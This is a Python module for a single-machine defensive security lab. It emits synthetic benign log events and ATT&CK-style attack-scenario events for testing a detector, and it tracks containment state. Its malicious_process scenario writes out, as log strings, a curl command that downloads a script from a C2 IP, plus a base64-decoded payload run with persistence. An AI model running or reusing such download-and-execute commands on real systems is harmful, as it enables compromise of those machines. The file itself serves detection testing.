"""The SHIELD lab: a defensive security testbed that runs on one machine.

- Benign baseline: normal users, services and backup jobs generate honest day-to-day
  security events (the FP benchmark measures against this).
- Attack scenarios: five ATT&CK-mapped attack playbooks (the lab equivalent of Atomic
  Red Team — emulating techniques and emitting the log events they produce).
- Containment: blocking an IP / locking a user has real effects — the lab honors it.
"""

from __future__ import annotations

import logging
import random
import time

from app.core.models import Tenant as _Tenant

logger = logging.getLogger("shield.lab")

# lab topology
HOSTS = ["web-1", "db-1", "workstation-1", "workstation-2"]
USERS = ["alice", "bob", "carol", "svc-backup"]
ATTACKER_IP = "185.220.101.42"
C2_IP = "45.155.205.233"
EXTERNAL_IP = "203.0.113.77"

# runtime containment state (lab process); honored by the emitter
BLOCKED_IPS: set[str] = set()
LOCKED_USERS: set[str] = set()

SCENARIOS = ["brute_force", "lateral_movement", "malicious_process", "data_exfil", "c2_beacon"]

_benign_task: object | None = None  # handle held by app lifespan / watchdog


def is_blocked(ip: str | None, user: str | None) -> bool:
    return (ip in BLOCKED_IPS) or (user in LOCKED_USERS)


def _event(host, event, user=None, src_ip=None, dst_ip=None, dst_port=None,
           external=False, process=None, bytes_out=0) -> dict:
    return {"host": host, "event": event, "user": user, "src_ip": src_ip,
            "dst_ip": dst_ip, "dst_port": dst_port, "external": external,
            "process": process, "bytes_out": bytes_out,
            "ts": time.time()}


def benign_window(now: float | None = None) -> list[dict]:
    """One ~30s slice of honest day-to-day activity (no attacks)."""
    now = now or time.time()
    events = []
    for _ in range(random.randint(2, 5)):
        user = random.choice(USERS)
        if user in LOCKED_USERS:
            continue
        events.append(_event(random.choice(["workstation-1", "workstation-2"]),
                             "login_success", user=user,
                             src_ip=f"10.0.0.{random.randint(20, 40)}"))
    for _ in range(random.randint(3, 8)):
        events.append(_event(random.choice(HOSTS), "connection",
                             dst_ip=random.choice(["10.0.0.5", "10.0.0.6"]),
                             dst_port=random.choice([443, 5432, 22])))
    if random.random() < 0.06:  # occasional human typo
        events.append(_event("web-1", "login_failure", user=random.choice(USERS),
                             src_ip=f"10.0.0.{random.randint(20, 40)}"))
    if random.random() < 0.03:  # scheduled backup
        events.append(_event("db-1", "data_transfer", dst_ip="10.0.0.5",
                             dst_port=443, bytes_out=random.randint(500_000, 1_500_000)))
    for e in events:
        e["ts"] = now
    return events


def scenario_events(kind: str, target: str | None = None) -> list[dict]:
    """Emit the log events a real attack playbook produces (delivered over ~20s by the lab)."""
    target = target or random.choice(["web-1", "db-1"])
    ev: list[dict] = []
    if kind == "brute_force":
        for _ in range(8):
            ev.append(_event(target, "login_failure", user="admin", src_ip=ATTACKER_IP))
        ev.append(_event(target, "login_success", user="admin", src_ip=ATTACKER_IP))
    elif kind == "lateral_movement":
        ev.append(_event("web-1", "login_success", user="svc-backup", src_ip=ATTACKER_IP))
        for port in (22, 445, 3389, 5432, 6379, 8080, 8443, 9200, 27017, 11211, 3306, 5985):
            ev.append(_event("web-1", "connection", dst_ip="10.0.0.6", dst_port=port))
        ev.append(_event("db-1", "login_success", user="svc-backup", src_ip="10.0.0.3"))
    elif kind == "malicious_process":
        ev.append(_event(target, "login_success", user="alice", src_ip=ATTACKER_IP))
        ev.append(_event(target, "process_exec", user="alice",
                         process=f"curl http://{C2_IP}/p.sh -o /tmp/p.sh"))
        ev.append(_event(target, "process_exec", user="alice",
                         process="base64 -d payload.b64 > /tmp/runner"))
        ev.append(_event(target, "process_exec", user="alice", process="/tmp/runner --persist"))
    elif kind == "data_exfil":
        ev.append(_event(target, "data_transfer", dst_ip=EXTERNAL_IP, dst_port=8443,
                         external=True, bytes_out=9_500_000))
    elif kind == "c2_beacon":
        for _ in range(6):
            ev.append(_event(target, "connection", dst_ip=C2_IP, dst_port=4444, external=True))
    return ev


def apply_containment(block_ip: str | None = None, lock_user: str | None = None) -> dict:
    applied = {}
    if block_ip:
        BLOCKED_IPS.add(block_ip)
        applied["blocked_ip"] = block_ip
    if lock_user:
        LOCKED_USERS.add(lock_user)
        applied["locked_user"] = lock_user
    return applied


async def benign_loop() -> None:
    """Continuous honest background traffic — inserted directly into the event store
    (the lab runs in-process with the detector on soc/all profiles)."""
    import asyncio

    from app.db import SessionLocal
    from app.shield.models import SecurityEvent

    while True:
        try:
            async with SessionLocal() as db:
                from sqlalchemy import select

                tenants = (await db.execute(select(_Tenant.id))).scalars().all()
                for tenant_id in tenants:
                    if is_blocked(None, None):
                        continue
                    for e in benign_window():
                        if is_blocked(e.get("src_ip"), e.get("user")):
                            continue
                        db.add(SecurityEvent(
                            tenant_id=tenant_id, host=e["host"], event=e["event"],
                            user=e.get("user"), src_ip=e.get("src_ip"),
                            dst_ip=e.get("dst_ip"), dst_port=e.get("dst_port"),
                            external=bool(e.get("external")), process=e.get("process"),
                            bytes_out=int(e.get("bytes_out", 0)),
                        ))
                await db.commit()
        except Exception:  # noqa: BLE001 — the lab must never take the API down
            # but a broken lab that emits nothing must be VISIBLE
            logger.exception("shield lab benign loop failed")
        await asyncio.sleep(20)


async def ingest_events(tenant_id: str, events: list[dict], pace: float = 0.3) -> None:
    """Insert scenario events with live pacing (spread over seconds)."""
    import asyncio as _aio

    from app.db import SessionLocal
    from app.shield.models import SecurityEvent as _SE

    for e in events:
        async with SessionLocal() as db:
            if is_blocked(e.get("src_ip"), e.get("user")):
                e = {**e, "blocked": True}
            db.add(_SE(
                tenant_id=tenant_id, host=e["host"], event=e["event"], user=e.get("user"),
                src_ip=e.get("src_ip"), dst_ip=e.get("dst_ip"), dst_port=e.get("dst_port"),
                external=bool(e.get("external")), process=e.get("process"),
                bytes_out=int(e.get("bytes_out", 0)), blocked=bool(e.get("blocked")),
            ))
            await db.commit()
        await _aio.sleep(pace)